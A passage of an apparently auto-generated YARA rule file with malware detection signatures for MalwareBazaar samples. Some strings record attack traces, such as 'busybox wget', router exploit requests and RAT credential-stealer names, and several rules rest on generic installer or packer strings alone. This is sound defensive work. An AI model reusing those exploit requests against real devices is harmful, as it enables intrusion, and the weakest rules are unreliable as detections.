        $s9 = "s:IDS_CMDEXTRACTING"
        $s10 = "s:IDS_FILEHEADERBROKEN"
        $s11 = "s:IDS_CANNOTOPEN"
        $s12 = "s:IDS_CANNOTCREATE"
        $s13 = "s:IDS_WRITEERROR"
        $s14 = "s:IDS_READERROR"
        $s15 = "s:IDS_CLOSEERROR"
        $s16 = "s:IDS_CREATEERRORS"
        $s17 = "s:IDS_ALLFILES"
        $s18 = "s:IDS_EXTRFILESTO"
        $s19 = "s:IDS_EXTRFILESTOTEMP"
        $s20 = "s:IDS_WRONGFILEPASSWORD"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 384KB and
        all of them
}

rule Windows_387304b50852736281a29d00ed2d8cdb3368d171215f1099b41c404e7e099193
{
    meta:
        description = "Auto ML: 387304b50852736281a29d00ed2d8cdb3368d171215f1099b41c404e7e099193"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "setybdetH1"
        $s7 = "setybdetL1"
        $s8 = "uespemosarenegylmodnarodsetybdet"
        $s9 = "alserueullC:\\Users\\Administrator\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\serde_json-1.0.82\\src\\de.rs"
        $s10 = "C:\\Users\\Administrator\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\serde_json-1.0.82\\src\\ser.rs"
        $s11 = "attempt to calculate the remainder with a divisor of zeroC:\\Users\\Administrator\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\block-buffer-0.10.2\\src\\lib.rs"
        $s12 = "/rustc/e092d0b6b43f2de967af0887873151bb1c0b18d3\\library\\std\\src\\io\\readbuf.rs"
        $s13 = "attempt to join into collection with len > usize::MAX/rustc/e092d0b6b43f2de967af0887873151bb1c0b18d3\\library\\alloc\\src\\str.rs"
        $s14 = "C:\\Users\\Administrator\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\hyper-0.14.20\\src\\body\\to_bytes.rs"
        $s15 = "C:\\Users\\Administrator\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\tokio-1.20.1\\src\\runtime\\thread_pool\\mod.rs"
        $s16 = "failed to park thread"
        $s17 = "C:\\Users\\Administrator\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\tokio-1.20.1\\src\\runtime\\mod.rs"
        $s18 = "C:\\Users\\Administrator\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\rand_core-0.6.3\\src\\block.rs"
        $s19 = "C:\\Users\\Administrator\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\reqwest-0.11.11\\src\\async_impl\\response.rs"
        $s20 = "src\\.\\tcp_conn\\windows.rs"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1552KB and
        all of them
}

rule Linux_38efe69f9db4ba93e17980885545a274023b1240b90d9ee9ec08fa162de4e31c
{
    meta:
        description = "Auto ML: 38efe69f9db4ba93e17980885545a274023b1240b90d9ee9ec08fa162de4e31c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 162KB and
        all of them
}

rule Linux_38f457068ed16163c697e47ae7b48aea52374d96655cbf2eee68c6f89c80b8be
{
    meta:
        description = "Auto ML: 38f457068ed16163c697e47ae7b48aea52374d96655cbf2eee68c6f89c80b8be"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 27KB and
        all of them
}

rule Linux_3913c6bd123cc72db0d4ceab2523ba93d9fc130faf438bc0c124078cfe25ddaa
{
    meta:
        description = "Auto ML: 3913c6bd123cc72db0d4ceab2523ba93d9fc130faf438bc0c124078cfe25ddaa"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 33KB and
        all of them
}

rule Linux_0046342a57cfdc865eacd99b3fa62d4f6365ddc3392677b730f96eadb0a497e6
{
    meta:
        description = "Auto ML: 0046342a57cfdc865eacd99b3fa62d4f6365ddc3392677b730f96eadb0a497e6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "'GeTM"
        $s2 = "'GeTh"
        $s3 = "PROT_EXEC|PROT_WRITE failed."
        $s4 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 1550KB and
        all of them
}

rule Linux_046956dedb920f7c30fce31c7e0f9f5f92f9e5b2f438586256b2aee489141a0a
{
    meta:
        description = "Auto ML: 046956dedb920f7c30fce31c7e0f9f5f92f9e5b2f438586256b2aee489141a0a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 189KB and
        all of them
}

rule Windows_395dff94e3b067deaa8bf4ccaeff47ea6171b325b9d065838cca45ea78f2b2e6
{
    meta:
        description = "Auto ML: 395dff94e3b067deaa8bf4ccaeff47ea6171b325b9d065838cca45ea78f2b2e6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p."
        $s6 = "__getmainargs"
        $s7 = "__set_app_type"
        $s8 = "__setusermatherr"
        $s9 = "fwrite"
        $s10 = "memset"
        $s11 = "DeleteCriticalSection"
        $s12 = "GetLastError"
        $s13 = "SetUnhandledExceptionFilter"
        $s14 = "TlsGetValue"
        $s15 = "msvcrt.dll"
        $s16 = "KERNEL32.dll"
        $s17 = "BGET"
    condition:
        uint32(0) == 0x00785a4d and
        filesize < 2536KB and
        all of them
}

rule Windows_396a6b2f82a81fc2009611d69541bc39c7184dff470726e2b583575e593e649a
{
    meta:
        description = "Auto ML: 396a6b2f82a81fc2009611d69541bc39c7184dff470726e2b583575e593e649a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "USERENV"
        $s6 = "SETUPAPI"
        $s7 = "KERNEL32"
        $s8 = "SetDefaultDllDirectories"
        $s9 = "GetDiskFreeSpaceExW"
        $s10 = "GetUserDefaultUILanguage"
        $s11 = "RegDeleteKeyExW"
        $s12 = "SHELL32"
        $s13 = "SHGetKnownFolderPath"
        $s14 = "SHGetFolderPathW"
        $s15 = "GetFileVersionInfoSizeW"
        $s16 = "GetFileVersionInfoW"
        $s17 = "RegCloseKey"
        $s18 = "RegDeleteKeyW"
        $s19 = "RegDeleteValueW"
        $s20 = "RegSetValueExW"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 679KB and
        all of them
}

rule Windows_39a8c585d60201261bad7600af0f3840fcb174fec63263ebf55020e4dedc157c
{
    meta:
        description = "Auto ML: 39a8c585d60201261bad7600af0f3840fcb174fec63263ebf55020e4dedc157c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1554KB and
        all of them
}

rule Windows_39ee34923fc77f5cacd1210dd87e95c101cfb53b947de24da39f82152afa0f4c
{
    meta:
        description = "Auto ML: 39ee34923fc77f5cacd1210dd87e95c101cfb53b947de24da39f82152afa0f4c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.IO"
        $s6 = "DELETEHELPER"
        $s7 = "System.Data"
        $s8 = "loadData"
        $s9 = "Read"
        $s10 = "QuanLyHS_Load"
        $s11 = "QuanLyGV_Load"
        $s12 = "add_Load"
        $s13 = "ManHinhChinh_Load"
        $s14 = "DangNhap_Load"
        $s15 = "DangKy_Load"
        $s16 = "TTGiangDay_Load"
        $s17 = "get_OrangeRed"
        $s18 = "get_Checked"
        $s19 = "set_Checked"
        $s20 = "set_FormattingEnabled"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 747KB and
        all of them
}

rule Linux_3a3688ea5e176a4a0027053ccafa1f3d17b245561342320ebda50eebb0856998
{
    meta:
        description = "Auto ML: 3a3688ea5e176a4a0027053ccafa1f3d17b245561342320ebda50eebb0856998"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 45KB and
        all of them
}

rule Windows_3ac3d3fd3244a1520c0116c7ab762fbfc38a5cbeb7fa31c457208623834ca3f1
{
    meta:
        description = "Auto ML: 3ac3d3fd3244a1520c0116c7ab762fbfc38a5cbeb7fa31c457208623834ca3f1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "loadingCircle1"
        $s5 = "openFileDialog1"
        $s6 = "<Module>"
        $s7 = "System.IO"
        $s8 = "get_SelectedTab"
        $s9 = "get_zncUc"
        $s10 = "setPathDoc"
        $s11 = "add_Load"
        $s12 = "frmSelPath_Load"
        $s13 = "frmMain_Load"
        $s14 = "set_RotationSpeed"
        $s15 = "get_Enabled"
        $s16 = "set_Enabled"
        $s17 = "get_Cancelled"
        $s18 = "add_FormClosed"
        $s19 = "frmLoading_FormClosed"
        $s20 = "frmMain_FormClosed"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 708KB and
        all of them
}

rule Windows_3ac6dde9c9dfcaed7066ea5af5121fd75a7c6c1ab9bb7bb4ca35784d50efa202
{
    meta:
        description = "Auto ML: 3ac6dde9c9dfcaed7066ea5af5121fd75a7c6c1ab9bb7bb4ca35784d50efa202"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "cmdqcsorsljvarbdgjcgncwavtvucdzvfiwbprwshfgxaafoedmyukeovwubstjzmcxgjosndtjhxuuznmzkylcsrdbx"
        $s6 = "attempts."
        $s7 = "You are getting closer."
        $s8 = "You are very close!"
        $s9 = "attempts. The correct number was"
        $s10 = "ios_base::badbit set"
        $s11 = "ios_base::failbit set"
        $s12 = "ios_base::eofbit set"
        $s13 = "already connected"
        $s14 = "bad file descriptor"
        $s15 = "connection aborted"
        $s16 = "connection already in progress"
        $s17 = "connection refused"
        $s18 = "connection reset"
        $s19 = "file exists"
        $s20 = "file too large"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 661KB and
        all of them
}

rule Windows_3ae8d263abd33819980c81f1e0b6b876f06e5747807459e82a47fd518767358e
{
    meta:
        description = "Auto ML: 3ae8d263abd33819980c81f1e0b6b876f06e5747807459e82a47fd518767358e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Microsoft.Win32"
        $s5 = "WriteUInt64"
        $s6 = "GetAsUInt64"
        $s7 = "SetAsUInt64"
        $s8 = "<Module>"
        $s9 = "ES_SYSTEM_REQUIRED"
        $s10 = "get_FormatID"
        $s11 = "get_ASCII"
        $s12 = "System.IO"
        $s13 = "ReadServertData"
        $s14 = "System.Collections.Generic"
        $s15 = "get_SendSync"
        $s16 = "EndRead"
        $s17 = "BeginRead"
        $s18 = "Thread"
        $s19 = "Load"
        $s20 = "get_Connected"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 102KB and
        all of them
}

rule Linux_3afbef3a92b102f9b0e728f84a2636922406f1575a336e9ba313c1756a065aa7
{
    meta:
        description = "Auto ML: 3afbef3a92b102f9b0e728f84a2636922406f1575a336e9ba313c1756a065aa7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "@wWIn@"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB and
        all of them
}

rule Windows_3b20d2b68fa07bffa05fb0c61332ef5dbdd5aae247471d7c9a98e753b4a00a8e
{
    meta:
        description = "Auto ML: 3b20d2b68fa07bffa05fb0c61332ef5dbdd5aae247471d7c9a98e753b4a00a8e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4754KB and
        all of them
}

rule Windows_0473f031c92c25f207f6fc08f9e2bfc92b142e5dfcbf63b635a90de49342ba70
{
    meta:
        description = "Auto ML: 0473f031c92c25f207f6fc08f9e2bfc92b142e5dfcbf63b635a90de49342ba70"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System"
        $s6 = "HttpMessageHandler"
        $s7 = "System.Net.Http"
        $s8 = "System.IO"
        $s9 = "<Module>{bc59ed48-c966-41aa-8bba-58dcce0e217e}"
        $s10 = "InsertTemplate"
        $s11 = "System.Reflection"
        $s12 = "System.Reflection.Emit"
        $s13 = "GetMethod"
        $s14 = "get_CurrentDomain"
        $s15 = "ModuleBuilder"
        $s16 = "System.Linq"
        $s17 = "System.Core"
        $s18 = "System.Collections.Generic"
        $s19 = "ResolveTemplate"
        $s20 = "CountTemplate"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 811KB and
        all of them
}

rule Windows_3b28b6404fda828b7d9e9ea3c375fa4b14837a52ca341c71fb183b58c3f0cb09
{
    meta:
        description = "Auto ML: 3b28b6404fda828b7d9e9ea3c375fa4b14837a52ca341c71fb183b58c3f0cb09"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Runtime.CompilerServices"
        $s10 = "AssemblyFileVersionAttribute"
        $s11 = "System.Diagnostics"
        $s12 = "Kingdom.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{EADF9677-A0F5-4AD5-B13F-57A3824F2CD5}"
        $s15 = "<Module>{aaa8a92a-9a8c-40e6-af88-cbe4e8472006}"
        $s16 = "get_Days"
        $s17 = "kernel32.dll"
        $s18 = "CreateThread"
        $s19 = "get_Message"
        $s20 = "WriteLine"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 434KB and
        all of them
}

rule Windows_3ba4a1da7a6ffee3728964d71358824b4648959b55b61c450b4a0267b7006ed6
{
    meta:
        description = "Auto ML: 3ba4a1da7a6ffee3728964d71358824b4648959b55b61c450b4a0267b7006ed6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 344KB and
        all of them
}

rule Windows_3bccd5cdf61005f1008359d1fbf6bd705994189ddb234bdd25dc433866aa1f1f
{
    meta:
        description = "Auto ML: 3bccd5cdf61005f1008359d1fbf6bd705994189ddb234bdd25dc433866aa1f1f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "ReadInt32"
        $s5 = "WindowsFormsApplication16"
        $s6 = "<Module>"
        $s7 = "get_xhZA"
        $s8 = "System.IO"
        $s9 = "get_Data"
        $s10 = "GetData"
        $s11 = "get_Magenta"
        $s12 = "Form1_Load"
        $s13 = "add_Load"
        $s14 = "set_Enabled"
        $s15 = "set_AutoCompleteSource"
        $s16 = "get_KeyCode"
        $s17 = "set_AutoScaleMode"
        $s18 = "set_AutoCompleteMode"
        $s19 = "set_AutoSizeMode"
        $s20 = "set_ColumnHeadersHeightSizeMode"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 946KB and
        all of them
}

rule Windows_3c1a1e54203b5274bf12d78645769e36f82c671adfbdd455362d4d0c1792c91e
{
    meta:
        description = "Auto ML: 3c1a1e54203b5274bf12d78645769e36f82c671adfbdd455362d4d0c1792c91e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".text"
        $s3 = "`.data"
        $s4 = ".rdata"
        $s5 = "@.rsrc"
        $s6 = "GetLongPathNameW"
        $s7 = "TModuleInfo"
        $s8 = "TCustomFile"
        $s9 = "TFile"
        $s10 = "EFileError"
        $s11 = "TCompressedBlockReader"
        $s12 = "TSetupHeader"
        $s13 = "TSetupLanguageEntry="
        $s14 = "SetDllDirectoryW"
        $s15 = "SetSearchPathMode"
        $s16 = "SetProcessDEPPolicy"
        $s17 = "Inno Setup Setup Data (5.5.0) (u)"
        $s18 = "Inno Setup Messages (5.5.0) (u)"
        $s19 = "oleaut32.dll"
        $s20 = "advapi32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 13041KB and
        all of them
}

rule Windows_3c21c1067f2f7fd008b20dda0422e4b50f679aadf5e91817889f58d759282f1d
{
    meta:
        description = "Auto ML: 3c21c1067f2f7fd008b20dda0422e4b50f679aadf5e91817889f58d759282f1d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4754KB and
        all of them
}

rule Windows_3c816780d6733c7798f6348b2f3fa6be5bd0ac8413615280a5be3a89d8c64588
{
    meta:
        description = "Auto ML: 3c816780d6733c7798f6348b2f3fa6be5bd0ac8413615280a5be3a89d8c64588"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "HashSet`1"
        $s5 = "ReadInt32"
        $s6 = "ReadUInt16"
        $s7 = "get_OSSupportsIPv6"
        $s8 = "<Module>"
        $s9 = "SocketTTL"
        $s10 = "System.IO"
        $s11 = "get_Data"
        $s12 = "DownloadData"
        $s13 = "get_EndOfData"
        $s14 = "GetCallbackFromData"
        $s15 = "connectionData"
        $s16 = "TUserData"
        $s17 = "userData"
        $s18 = "ProcessData"
        $s19 = "GetData"
        $s20 = "get_RawData"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 128KB and
        all of them
}

rule Windows_3ca4e6deae0fb30f79adab295116a91011ca88e3d75187f334a39a91e22254cf
{
    meta:
        description = "Auto ML: 3ca4e6deae0fb30f79adab295116a91011ca88e3d75187f334a39a91e22254cf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB and
        all of them
}

rule Linux_3cc449cdf4c3807008de4d940bdc3b36b0da6dab93ce084e0aba2139609176c4
{
    meta:
        description = "Auto ML: 3cc449cdf4c3807008de4d940bdc3b36b0da6dab93ce084e0aba2139609176c4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 42KB and
        all of them
}

rule Windows_3d106114b04dfc52f4f90ac77925e9ccb455b486ac7d7b3d8a53d29568dfdadd
{
    meta:
        description = "Auto ML: 3d106114b04dfc52f4f90ac77925e9ccb455b486ac7d7b3d8a53d29568dfdadd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4469KB and
        all of them
}

rule Windows_3d24879020f71f37768efb2dcd3724477b190b9f0c7f87c72edb472f81123ec5
{
    meta:
        description = "Auto ML: 3d24879020f71f37768efb2dcd3724477b190b9f0c7f87c72edb472f81123ec5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GetProcessWindowStation"
        $s16 = "GetUserObjectInformationA"
        $s17 = "GetLastActivePopup"
        $s18 = "GetActiveWindow"
        $s19 = "USER32.DLL"
        $s20 = "msimg32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 239KB and
        all of them
}

rule Windows_048c51cddd7226942b94b0b406e6134fb17766eda673f1dd713fee7c845f4514
{
    meta:
        description = "Auto ML: 048c51cddd7226942b94b0b406e6134fb17766eda673f1dd713fee7c845f4514"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "ExecuteFile"
        $s6 = "Can not open output file"
        $s7 = "Can not delete output file"
        $s8 = "Can not open the file as archive"
        $s9 = "Can not find archive file"
        $s10 = "kernel32.dll"
        $s11 = "USERENV"
        $s12 = "SETUPAPI"
        $s13 = "SetDefaultDllDirectories"
        $s14 = "OLEAUT32.dll"
        $s15 = "ShowWindow"
        $s16 = "SetWindowTextW"
        $s17 = "DestroyWindow"
        $s18 = "LoadStringW"
